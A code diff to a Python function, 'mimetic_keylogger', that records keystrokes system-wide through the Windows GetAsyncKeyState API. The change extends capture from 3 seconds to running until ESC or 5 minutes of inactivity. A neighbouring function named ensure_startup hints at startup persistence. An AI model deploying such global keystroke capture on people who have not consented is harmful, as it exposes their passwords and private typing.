@@ -260,12 +260,14 @@ def ensure_startup():
 
 
 def mimetic_keylogger():
-    """Capture keyboard input globally using Windows API."""
+    """Capture keyboard input globally until ESC or 5 minutes inactivity."""
     import ctypes
     import threading
 
     log = []
     stop_event = threading.Event()
+    last_key_time = time.time()
+    inactivity_timeout = 300  # 5 minutes
 
     # Windows key codes
     VK_ESCAPE = 0x1B
@@ -309,11 +311,15 @@ def mimetic_keylogger():
             except:
                 return None
 
-        # Poll for 3 seconds
-        start_time = time.time()
+        # Poll until ESC or 5 minutes inactivity
         last_keys = set()
 
-        while time.time() - start_time < 3 and not stop_event.is_set():
+        while not stop_event.is_set():
+            # Check inactivity timeout
+            elapsed_inactive = time.time() - last_key_time
+            if elapsed_inactive > inactivity_timeout:
+                break
+
             # Check all keys
             for vk_code in range(256):
                 key_state = GetAsyncKeyState(vk_code)
@@ -322,6 +328,7 @@ def mimetic_keylogger():
                 # Check if key state changed (pressed this frame)
                 if is_pressed and vk_code not in last_keys:
                     last_keys.add(vk_code)
+                    last_key_time = time.time()
 
                     # ESC stops immediately
                     if vk_code == VK_ESCAPE:
@@ -334,6 +341,9 @@ def mimetic_keylogger():
                         log.append(key_str)
                 elif not is_pressed and vk_code in last_keys:
                     last_keys.discard(vk_code)
+
+            if stop_event.is_set():
+                break
 
             time.sleep(0.05)  # Poll every 50ms
 
